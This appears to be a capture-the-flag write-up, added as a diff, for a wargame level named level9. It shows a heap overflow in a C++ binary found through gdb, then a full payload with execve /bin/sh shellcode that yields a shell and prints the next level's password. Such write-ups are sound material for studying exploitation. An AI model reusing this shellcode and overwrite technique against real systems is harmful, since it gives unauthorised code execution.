@@ -1,0 +1,74 @@
+- We started the program, we didn't get any response, but after giving it an argument with a big payload we got a Segmentation fault.
+
+$> ./level9 $(python -c "print 'a' * 150")
+Segmentation fault (core dumped)
+
+- we started disassembling our program, we found that it's a C++ program.
+
+$> objdump -T level9
+[...]
+00000000      DF *UND*	00000000  GLIBCXX_3.4 _ZNSt8ios_base4InitC1Ev
+[...]
+
+- Also we found the program call memcpy function and puts the address of eax into edx then call the edx in main<+159>
+
+$> gdb ./level9
+
+(gdb) disas main
+[...]
+0x08048674 <+128>:	mov    DWORD PTR [esp],eax
+0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
+[...]
+
+(gdb) disas 0x804870e
+[...]
+0x08048730 <+34>:	mov    DWORD PTR [esp],edx
+0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
+0x08048738 <+42>:	leave
+[...]
+
+- We found the program segfault in 0x08048682, for that we break on this instruction and run the program again.
+
+(gdb) break *0x08048682
+(gdb) r $(python -c 'print "A" * 200')
+(gdb) info registers
+eax            0x41414141	1094795585
+ecx            0x41414141	1094795585
+[...]
+
+
+(gdb) x/x $esp
+0xbffff610:	0x0804a008
+(gdb) x/210x 0x0804a008
+0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
+0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a048:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a058:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a068:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a078:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a088:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a098:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a0a8:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a0b8:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a0c8:	0x41414141	0x41414141	0x41414141	0x00000000
+
+- Our string started 4 bytes after 0x0804a008, for our string is stored at this address 0x0804a008 + 4 = 0x0804a00c
+
+- Now we need to prepare our payload with this format:
+
+Address of our string - SHELLCODE (to run /bin/sh) - OFFSET - Address of our string
+
+- Address of our string: \x0c\xa0\x04\x08 (4 Bytes)
+
+- The shell code: \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80 (21 Bytes)
+
+- The offset is 108 (using the same method of the previous levels), but in final we have 108 - 21 - 4 = 83
+
+$> ./level9 $(python -c "print '\x0c\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'")
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
